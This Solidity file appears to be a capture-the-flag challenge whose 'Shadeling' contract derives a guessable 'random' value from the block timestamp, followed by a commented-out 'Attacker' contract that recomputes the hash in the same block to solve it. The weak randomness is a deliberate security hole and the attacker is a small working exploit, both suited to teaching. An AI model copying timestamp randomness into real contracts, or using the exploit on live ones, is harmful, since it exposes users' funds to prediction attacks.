// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

contract Shadeling {
    bool public isPredicted;

    function predict(bytes32 x) external {
        require(x == _random());
        isPredicted = true;
    }

    function _random() internal view returns (bytes32) {
        return keccak256(abi.encode(block.timestamp));
    }
}

// // SPDX-License-Identifier: MIT
// pragma solidity ^0.8.19;

// contract Shadeling {
//     bool public isPredicted;

//     function predict(bytes32 x) external {
//         require(x == _random(), "Prediction failed!");
//         isPredicted = true;
//     }

//     function _random() internal view returns (bytes32) {
//         return keccak256(abi.encode(block.timestamp));
//     }
// }

// contract Attacker {
//     Shadeling public shadeling;

//     constructor(address shadelingAddress) {
//         shadeling = Shadeling(shadelingAddress);
//     }

//     function attack() external {
//         bytes32 prediction = keccak256(abi.encode(block.timestamp));
//         shadeling.predict(prediction);
//     }
// }
